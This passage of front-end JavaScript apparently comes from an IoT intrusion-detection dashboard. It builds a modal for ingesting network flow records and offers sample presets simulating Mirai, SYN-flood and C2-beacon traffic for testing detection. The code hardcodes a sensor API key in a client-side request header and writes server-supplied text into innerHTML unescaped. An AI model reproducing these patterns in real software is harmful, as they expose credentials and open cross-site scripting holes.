        <label style="font-size: 11px; text-transform: uppercase; color: var(--text-muted); display: block; margin-bottom: 6px;">Flow Record Payload (JSON):</label>
        <textarea id="ingest-json-payload" rows="11"
                  style="width: 100%; background: #020b07; color: #a7f3d0; font-family: var(--font-mono); font-size: 11px; padding: 12px; border-radius: var(--radius-sm); border: 1px solid var(--border-subtle); resize: vertical;">${JSON.stringify(samplePresets.mirai, null, 2)}</textarea>
      </div>

      <div id="ingest-result-banner" style="display: none; margin-bottom: 16px; padding: 12px; border-radius: var(--radius-sm);"></div>

      <div style="display: flex; justify-content: flex-end; gap: 10px;">
        <button class="btn btn-secondary" onclick="TrafficView.closeIngestModal()">Close</button>
        <button class="btn btn-primary" onclick="TrafficView.submitExternalIngest()">
          Ingest Flow into Detection Engine
        </button>
      </div>
    `;

    modal.classList.add("open");
  },

  closeIngestModal() {
    const modal = document.getElementById("flow-ingest-modal");
    if (modal) modal.classList.remove("open");
  },

  loadIngestPreset(key) {
    const presets = {
      mirai: {
        device_id: "DEV-101",
        source_ip: "192.168.1.101",
        dest_ip: "185.193.64.12",
        dest_port: 23,
        protocol: "TCP",
        packet_rate: 520.0,
        byte_rate: 66560,
        conn_freq: 28.5,
        syn_ratio: 0.94,
        payload_entropy: 7.35,
        flow_duration: 0.8,
        collector_source: "Zeek Mirai Telnet Incursion Probe"
      },
      synflood: {
        device_id: "DEV-107",
        source_ip: "192.168.1.107",
        dest_ip: "185.193.64.12",
        dest_port: 80,
        protocol: "TCP",
        packet_rate: 780.0,
        byte_rate: 49920,
        conn_freq: 55.0,
        syn_ratio: 0.98,
        payload_entropy: 3.8,
        flow_duration: 0.05,
        collector_source: "NetFlow v9 DoS Telemetry"
      },
      c2beacon: {
        device_id: "DEV-105",
        source_ip: "192.168.1.105",
        dest_ip: "45.142.213.9",
        dest_port: 4444,
        protocol: "TCP",
        packet_rate: 22.0,
        byte_rate: 15400,
        conn_freq: 14.0,
        syn_ratio: 0.12,
        payload_entropy: 7.85,
        flow_duration: 3.5,
        collector_source: "Suricata C2 Heartbeat Sensor"
      },
      benign: {
        device_id: "DEV-103",
        source_ip: "192.168.1.103",
        dest_ip: "34.117.59.81",
        dest_port: 1883,
        protocol: "MQTT",
        packet_rate: 2.4,
        byte_rate: 850,
        conn_freq: 0.8,
        syn_ratio: 0.02,
        payload_entropy: 4.1,
        flow_duration: 15.0,
        collector_source: "IoT Edge Telemetry Agent"
      }
    };

    const textarea = document.getElementById("ingest-json-payload");
    if (textarea && presets[key]) {
      textarea.value = JSON.stringify(presets[key], null, 2);
    }
  },

  async runDemoScenario(scenarioKey) {
    if (!scenarioKey) return;
    App.showToast(`Injecting demo scenario: ${scenarioKey}...`, "info");
    try {
      const resp = await (window.ApiClient ? window.ApiClient.demo.runScenario(scenarioKey) : fetch("/api/demo/scenario", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ scenario: scenarioKey })
      }).then(r => r.json()));

      const data = resp.data || resp;
      if (data && data.events) {
        const events = data.events || [];
        events.forEach(evt => {
          const flowRecord = {
            flow_id: evt.flow_id,
            timestamp: evt.timestamp || new Date().toISOString().slice(11, 19),
            device_id: evt.device_id,
            device_name: evt.device_name || evt.device_id,
            source_ip: evt.source_ip,
            dest_ip: evt.dest_ip,
            dest_port: evt.dest_port,
            protocol: evt.protocol,
            packet_rate: evt.packet_rate || (evt.packet_count ? evt.packet_count / (evt.duration_sec || 1) : 0),
            byte_rate: evt.byte_rate || (evt.byte_count ? evt.byte_count / (evt.duration_sec || 1) : 0),
            payload_entropy: evt.payload_entropy || 4.2,
            status: evt.verdict || "Normal",
            risk_score: evt.risk_score || 0,
            rule_matches: evt.rules_triggered || [],
            is_demo: true,
            data_source: "demo_scenario",
            ml_prediction: {
              verdict: evt.verdict || "Normal",
              risk_score: (evt.risk_score || 0) / 100,
              confidence: 0.95
            }
          };
          App.state.flows.unshift(flowRecord);
        });

        if (App.state.flows.length > 100) {
          App.state.flows = App.state.flows.slice(0, 100);
        }

        this.renderFlows();
        App.showToast(`Injected ${events.length} flows: ${data.scenario_title || scenarioKey} (${data.data_source})`, "success");
      }
    } catch (err) {
      console.error("[TrafficView] Demo scenario error:", err);
      App.showToast("Failed to run demo scenario: " + err.message, "danger");
    }
  },

  async submitExternalIngest() {
    const textarea = document.getElementById("ingest-json-payload");
    const resultBanner = document.getElementById("ingest-result-banner");
    if (!textarea) return;

    let parsed = null;
    try {
      parsed = JSON.parse(textarea.value);
    } catch (err) {
      if (resultBanner) {
        resultBanner.style.display = "block";
        resultBanner.style.background = "var(--state-danger-bg)";
        resultBanner.style.border = "1px solid var(--state-danger-border)";
        resultBanner.innerHTML = `<span style="color: var(--state-danger);">Invalid JSON syntax: ${err.message}</span>`;
      }
      return;
    }

    try {
      const res = await fetch("/api/traffic/events", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "X-API-Key": "netguard-sensor-key-2026"
        },
        body: JSON.stringify(parsed)
      });
      const data = await res.json();

      if (data.success && data.data) {
        const analyzed = data.data;

        // Check if duplicate ignored
        if (analyzed.status === "duplicate_ignored") {
          if (resultBanner) {
            resultBanner.style.display = "block";
            resultBanner.style.background = "rgba(245, 158, 11, 0.15)";
            resultBanner.style.border = "1px solid rgba(245, 158, 11, 0.3)";
            resultBanner.innerHTML = `
              <div style="font-weight: 700; color: #f59e0b; margin-bottom: 2px;">
                ⚠ Duplicate Flow Ignored (Idempotency Filter)
              </div>
              <div style="font-size: 11px; color: var(--text-main);">
                ${analyzed.message || 'Flow fingerprint identical to recent ingestion event.'} (Hash: ${analyzed.flow_hash ? analyzed.flow_hash.slice(0, 12) + '...' : ''})
              </div>
            `;
          }
          App.showToast("Duplicate flow event ignored by idempotency engine", "warning");
          return;
        }

        const isHigh = analyzed.verdict === "High-Risk";
        const flowRecord = {
          flow_id: analyzed.event_id || analyzed.flow_id,
          timestamp: analyzed.timestamp || new Date().toISOString().slice(11, 19),
          device_id: parsed.device_id || "DEV-UNKNOWN",
          device_name: parsed.device_name || parsed.device_id || "Collector Sensor",
          source_ip: parsed.source_ip,
          dest_ip: parsed.destination_ip || parsed.dest_ip,
          dest_port: parsed.destination_port || parsed.dest_port,
          protocol: parsed.protocol,
          packet_rate: parsed.packet_rate || (parsed.packet_count ? parsed.packet_count / (parsed.duration_sec || 1) : 0),
          byte_rate: parsed.byte_rate || (parsed.byte_count ? parsed.byte_count / (parsed.duration_sec || 1) : 0),
          payload_entropy: parsed.payload_entropy || (parsed.flow_statistics ? parsed.flow_statistics.payload_entropy : 4.2) || 4.2,
          status: analyzed.verdict || "Normal",
          risk_score: analyzed.risk_score || 0,
          rule_matches: analyzed.rules_triggered || [],
          is_demo: Boolean(analyzed.is_demo),
          data_source: analyzed.data_source || "collector",
          ml_prediction: {
            verdict: analyzed.verdict || "Normal",
            risk_score: (analyzed.risk_score || 0) / 100,
            confidence: 0.95
          }
        };

        App.state.flows.unshift(flowRecord);
        if (App.state.flows.length > 100) App.state.flows = App.state.flows.slice(0, 100);

        if (resultBanner) {
          resultBanner.style.display = "block";
          resultBanner.style.background = isHigh ? "var(--state-danger-bg)" : "rgba(34, 197, 94, 0.1)";
          resultBanner.style.border = `1px solid ${isHigh ? 'var(--state-danger-border)' : 'var(--border-subtle)'}`;
          resultBanner.innerHTML = `
            <div style="font-weight: 700; color: ${isHigh ? 'var(--state-danger)' : 'var(--highlight-mint)'}; margin-bottom: 2px;">
              ✓ Flow Ingested & Analyzed — Verdict: ${analyzed.verdict} [${(analyzed.data_source || 'collector').toUpperCase()}]
            </div>
            <div style="font-size: 11px; color: var(--text-main);">
              Rules Triggered: ${analyzed.rules_triggered && analyzed.rules_triggered.length > 0 ? analyzed.rules_triggered.map(r => r.rule_id).join(", ") : 'None'} · Flow ID: ${analyzed.event_id || analyzed.flow_id}
            </div>
          `;
        }

        App.showToast(`External flow ingested: ${analyzed.verdict} (${analyzed.data_source})`, isHigh ? "danger" : "success");
        this.renderFlows();
      } else {
        const errMsg = data.error || (data.message ? data.message : "Ingestion failed");
        if (resultBanner) {
          resultBanner.style.display = "block";
          resultBanner.style.background = "var(--state-danger-bg)";
          resultBanner.style.border = "1px solid var(--state-danger-border)";
          resultBanner.innerHTML = `<span style="color: var(--state-danger);">Ingestion Rejected: ${errMsg}</span>`;
        }
        App.showToast(`Ingestion error: ${errMsg}`, "danger");
      }
    } catch (err) {
      App.showToast("Flow ingestion network error: " + err.message, "danger");
    }
  }
};
